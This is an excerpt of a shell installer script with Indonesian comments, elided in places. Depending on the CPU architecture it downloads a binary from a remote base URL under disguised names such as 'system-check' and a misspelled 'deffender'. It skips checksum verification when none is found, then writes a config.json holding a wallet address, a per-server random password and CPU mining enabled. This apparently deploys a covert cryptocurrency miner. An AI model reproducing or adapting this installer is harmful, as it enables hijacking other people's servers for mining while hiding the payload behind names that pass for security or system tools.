...
#   x86_64/amd64 -> system-check
#   aarch64/arm64 -> system-checking (or deffender.arm64 static if present)
...
# SKEMA: x64 -> system-check | aarch64 -> system-checking | armv7 -> deffender.armv7
case "$(uname -m)" in
...
# Cek checksum JIKA punya .sha256 di repo (file system-check punya .sha256-nya)
if dl "${BASE_URL}/${BIN}.sha256" "$BIN.sha256" 2>/dev/null && [ -s "$BIN.sha256" ]; then
    ...
    echo "[!] Tidak ada ${BIN}.sha256 di repo — skip verifikasi checksum"
    rm -f "$BIN.sha256"
fi
...
# --- Generate pass acak unik per instalasi/server ------------------------------
RANDPASS=""
if command -v od >/dev/null 2>&1 && [ -r /dev/urandom ]; then
    RANDPASS="$(od -An -N8 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')" || true
fi
if [ -z "$RANDPASS" ] && command -v tr >/dev/null 2>&1 && [ -r /dev/urandom ]; then
    RANDPASS="$(tr -dc 'a-f0-9' < /dev/urandom 2>/dev/null | head -c 16)" || true
fi
if [ -z "$RANDPASS" ]; then
    RANDPASS="server"
fi
...
if [ ! -f config.json ]; then
    echo "[+] Buat config.json (wallet: ${WALLET}, pass: ${RANDPASS})..."
    cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
